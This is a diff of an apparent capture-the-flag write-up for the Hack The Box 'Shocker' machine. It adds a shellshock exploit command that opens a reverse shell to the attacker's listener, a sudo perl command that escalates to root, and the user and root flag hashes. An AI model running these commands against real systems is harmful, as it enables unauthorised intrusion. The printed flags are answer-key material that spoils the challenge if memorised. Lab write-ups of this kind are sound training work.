@@ -38,15 +38,61 @@ Nmap done: 1 IP address (1 host up) scanned in 56.02 seconds
 
 3. Which is interesing, it's forbidden. Judging from the challenge title and the directory we found.
 4. This challenge could be related to `shellshock exploit` --> `Apache mod CGI`.
-5. This should be the one --> `https://www.exploit-db.com/exploits/34766` (since there's .sh files).
+5. This should be the one --> `https://www.exploit-db.com/exploits/34900` (since the web service is apache).
 
-![image](https://github.com/jon-brandy/hackthebox/assets/70703371/969a041f-98d0-4122-9947-bf198467955e)
-
-
-![image](https://github.com/jon-brandy/hackthebox/assets/70703371/304bbb31-bc3f-474b-aeda-5a7407448e56)
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/64478c1c-5325-41e0-8907-53dcba9bcd91)
 
 
-6. Let's use 1.
+6. Let's use the python script from the documentation.
+
+```bash
+python2 reverse_shell.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.26 lport=443 pages=/cgi-bin/user.sh
+```
+
+```
+┌──(brandy㉿bread-yolk)-[~/Downloads/machine/machine_shocker]
+└─$ python2 reverse_shell.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.26 lport=443 pages=/cgi-bin/user.sh
+[!] Started reverse shell handler
+[-] Trying exploit on : /cgi-bin/user.sh
+[!] Successfully exploited
+[!] Incoming connection from 10.10.10.56
+10.10.10.56> whoami
+shelly
+
+10.10.10.56> 
+```
 
 
+> GETTING USER FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7faa2e3b-6dc0-4795-82c2-2ab2bc6e05dd)
+
+
+## USER FLAG
+
+```
+c40e31276c798e9a8443c4c51866e733
+```
+
+7. After checking sudo permission for shelly, it seems we can run perl without password.
+8. This should gave us root easily by run --> `perl -e 'exec "/bin/sh";'`. Documentation --> https://gtfobins.github.io/gtfobins/perl/
+
+```
+10.10.10.56> sudo /usr/bin/perl -e 'exec "/bin/sh";'
+10.10.10.56> whoami
+root
+
+10.10.10.56> 
+```
+
+> GETTING ROOT FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7f6e5e4a-319f-44d8-a166-0eed6bc3fd6f)
+
+
+## ROOT FLAG
+
+```
+c5622bf600ecac10ac18b6095a0a614c
+```
 
